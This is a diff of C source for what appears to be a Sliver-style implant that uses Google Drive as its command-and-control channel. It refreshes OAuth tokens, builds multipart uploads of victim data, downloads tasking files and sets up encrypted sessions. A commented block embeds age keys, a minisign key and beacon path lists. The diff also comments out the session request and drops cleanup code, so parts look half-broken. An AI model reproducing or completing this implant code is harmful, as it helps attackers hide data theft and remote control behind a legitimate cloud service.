@@ -19,7 +19,7 @@ BOOL RefreshAccessToken
 	}
 
 	SecureZeroMemory(lpBody, sizeof(lpBody));
-	sprintf_s(lpBody, _countof(lpBody), "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
+	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
 	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
 	pHttpResp = SendHttpRequest(&pDriveConfig->HttpConfig, pHttpClient, NULL, POST, lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
 	if (pHttpResp == NULL) {
@@ -109,13 +109,13 @@ BOOL DriveUpload
 
 	ZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
 	GetSystemTime(&SystemTime);
-	sprintf(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szNewFileName);
+	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
 	lpUniqueBoundary = GenRandomStr(16);
-	cbBody = sprintf(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
+	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
 	memcpy(&lpBody[cbBody], pData, cbData);
-	cbBody += cbFileData;
-	cbBody += sprintf(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
-	sprintf(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
+	cbBody += cbData;
+	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
+	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
 	pUri = UriInit(szUrl);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -136,14 +136,6 @@ BOOL DriveUpload
 CLEANUP:
 	FreeHttpResp(pResp);
 	FreeHttpClient(pHttpClient);
-	if (pFileData != NULL) {
-		FREE(pFileData);
-	}
-
-	if (lpExtension != NULL) {
-		FREE(lpExtension);
-	}
-
 	if (lpUniqueBoundary != NULL) {
 		FREE(lpUniqueBoundary);
 	}
@@ -175,7 +167,7 @@ BOOL GetFileId
 	PHTTP_CLIENT pHttpClient = NULL;
 	PURI pUri = NULL;
 
-	sprintf(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
+	wsprintfA(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
 	pUri = UriInit(szUri);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -217,7 +209,7 @@ PBYTE GoogleDriveDownload
 	PHTTP_CLIENT pHttpClient = NULL;
 	PURI pUri = NULL;
 
-	sprintf(&szUri[lstrlenA(szUri)], "%s?alt=media", lpFileId);
+	wsprintfA(&szUri[lstrlenA(szUri)], "%s?alt=media", lpFileId);
 	pUri = UriInit(szUri);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -294,13 +286,6 @@ PSLIVER_DRIVE_CLIENT DriveClientInit()
 	/*CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
 	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
-	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
-	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
-	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
-	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
-	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
-	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
-	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
 	UINT64 uEncoderNonce = 51666;
 	CHAR szSliverClientName[32] = "TALL_MEAT";*/
@@ -397,7 +382,7 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	}
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
+	//pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -423,7 +408,7 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 
 	lpTemp = StrChrW(wszSetCookie, L'=');
 	lpTemp[0] = L'\0';
-	pSliverClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
+	//pSliverClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
 	bIsOk = TRUE;
 CLEANUP:
 	if (!bIsOk) {
@@ -441,10 +426,6 @@ CLEANUP:
 
 	if (lpEncodedSessionKey != NULL) {
 		FREE(lpEncodedSessionKey);
-	}
-
-	if (lpFullUri != NULL) {
-		FREE(lpFullUri);
 	}
 
 	if (pMarshalledData != NULL) {
